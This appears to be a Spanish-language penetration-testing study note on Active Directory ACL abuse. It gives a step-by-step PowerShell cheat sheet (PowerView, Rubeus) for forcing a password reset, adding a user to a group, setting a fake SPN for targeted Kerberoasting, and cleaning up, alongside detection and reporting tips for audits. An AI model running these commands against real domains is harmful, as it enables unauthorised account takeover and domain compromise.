---
tags:
  - ACL
  - AD
  - attack
---
## Conceptos Clave

* El abuso de Listas de Control de Acceso (ACLs) permite tomar el control de un dominio escalando privilegios a través de la ejecución encadenada de permisos mal configurados sobre otros usuarios y grupos.
* Es posible aprovechar la membresía en grupos anidados para heredar permisos efectivos, permitiendo llegar desde un grupo de bajo nivel técnico hasta el control de cuentas de administrador.
* Poseer permisos del tipo GenericAll sobre una cuenta permite ejecutar un ataque de Kerberoasting Dirigido; esto se logra modificando el atributo servicePrincipalName de la cuenta para crear un SPN falso y solicitar el ticket TGS.

  
## Herramientas Clave

* **PowerView.ps1:** Módulo de PowerShell fundamental para enumerar objetos del dominio y abusar de las ACLs (modificar contraseñas, añadir miembros a grupos, editar atributos SPN).

* **Rubeus:** Herramienta utilizada para extraer los tickets TGS durante el ataque de Kerberoasting.

* **[Hashcat](../../../📂%2008%20Herramientas&Cheatsheets/Hashcat.md)** Utilizado para crackear las contraseñas en claro de los hashes NTLMv2 o tickets TGS obtenidos durante los ataques.

* **pth-toolkit (pth-net) / targetedKerberoast:** Alternativas para ejecutar estas mismas técnicas desde un host atacante basado en Linux.

  
## Metodología Paso a Paso

1. **Fase 1: Cambio de Contraseña Forzado:** Se utiliza una primera cuenta comprometida para resetear la contraseña de un usuario intermedio sobre el que se tengan permisos de modificación.

2. **Fase 2: Modificación de Membresía de Grupos:** Una vez autenticado como el usuario intermedio, se utilizan los permisos que esta cuenta posee (ej. GenericWrite) para añadir nuestro usuario de ataque a un grupo de interés.

3. **Fase 3: Kerberoasting Dirigido (Targeted Kerberoasting):** Utilizando los permisos recién heredados (ej. GenericAll) sobre una cuenta con mayores privilegios, se crea temporalmente un SPN falso para volverla vulnerable a Kerberoasting. Tras solicitar el ticket TGS, se crackea offline.

4. **Fase 4: Limpieza (Cleanup):** Es imperativo revertir los cambios realizados en el entorno para evitar detecciones y dejar el entorno estable, revirtiendo grupos y borrando el SPN malicioso.

  
## Cheat Sheet de Comandos

### 1. Autenticación y Cambio de Contraseña Forzado
```powershell
# Crear objeto de credenciales para el usuario actualmente controlado

$SecPassword = ConvertTo-SecureString '<CURRENT_USER_PASSWORD>' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<CURRENT_USER>', $SecPassword)
```
  
```powershell
# Crear objeto SecureString con la nueva contraseña que le asignaremos a la victima intermedia

$targetPassword = ConvertTo-SecureString '<NEW_TARGET_PASSWORD>' -AsPlainText -Force
```
  
```powershell
# Forzar el cambio de contraseña del usuario objetivo usando PowerView

Import-Module .\PowerView.ps1

Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $targetPassword -Credential $Cred -Verbose
```

  
### 2. Abuso de GenericWrite para unirse a un Grupo

```powershell
# Crear nuevo objeto de credenciales asumiendo la identidad del usuario intermedio recién vulnerado

$SecPassword2 = ConvertTo-SecureString '<NEW_TARGET_PASSWORD>' -AsPlainText -Force

$Cred2 = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<TARGET_USER>', $SecPassword2)
```
  
```powershell
# Verificar que nuestro usuario intermedio no esté ya en el grupo

Get-ADGroup -Identity "<TARGET_GROUP>" -Properties * | Select -ExpandProperty Members
```
  
```powershell
# Añadir nuestra cuenta controlada al grupo objetivo utilizando las nuevas credenciales

Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members '<TARGET_USER>' -Credential $Cred2 -Verbose
```
  
```powershell
# Confirmar la adición exitosa

Get-DomainGroupMember -Identity "<TARGET_GROUP>" | Select MemberName
```

  
### 3. Abuso de GenericAll: Kerberoasting Dirigido
```powershell
# Crear un SPN falso sobre el usuario objetivo final utilizando los permisos heredados del grupo

Set-DomainObject -Credential $Cred2 -Identity <FINAL_TARGET_USER> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
  
```powershell
# Solicitar el ticket TGS usando Rubeus

.\Rubeus.exe kerberoast /user:<FINAL_TARGET_USER> /nowrap
```

  
### 4. Limpieza y Persistencia (Cleanup)
```powershell
# IMPORTANTE: Primero limpiar el SPN falso para no perder los derechos requeridos para hacerlo

Set-DomainObject -Credential $Cred2 -Identity <FINAL_TARGET_USER> -Clear serviceprincipalname -Verbose
```
  
```powershell
# Remover al usuario intermedio del grupo al que lo añadimos

Remove-DomainGroupMember -Identity "<TARGET_GROUP>" -Members '<TARGET_USER>' -Credential $Cred2 -Verbose
```
  
```powershell
# Confirmar que la cuenta fue removida

Get-DomainGroupMember -Identity "<TARGET_GROUP>" | Select MemberName |? {$_.MemberName -eq '<TARGET_USER>'} -Verbose
```

  
### 5. Análisis Forense Básico / Conversión SDDL
```powershell
# Convertir una cadena SDDL (encontrada en eventos 5136) a formato legible para entender qué permisos exactos se modificaron

ConvertFrom-SddlString "<SDDL_STRING>" | select -ExpandProperty DiscretionaryAcl
```

  
## "Gotchas" y Troubleshooting

* **Orden de la Limpieza:** El orden de la limpieza es crítico; si se elimina al usuario del grupo antes de remover el SPN falso, no se tendrán los derechos necesarios para borrar dicho SPN.

* **Hashes AES en Kerberoasting:** Rubeus puede devolver hashes AES para cuentas que tengan habilitado AES; para forzar RC4_HMAC se pueden utilizar las banderas `/ticket:X` o `/tgtdeleg`.

* **Eventos de Monitorización (OpSec):** Al modificar la ACL de un objeto de dominio, se generará el Event ID 5136 ("A directory service object was modified"), lo cual delatará la modificación de los permisos.

* **SDDL (Security Descriptor Definition Language):** La información generada en los eventos de Windows sobre cambios de ACLs no es legible por humanos nativamente y debe convertirse para interpretarse correctamente.

* **Reporte Fidedigno:** Durante una auditoría real, todo cambio temporal realizado para la explotación debe documentarse detalladamente en el reporte final para la corrección por parte del cliente.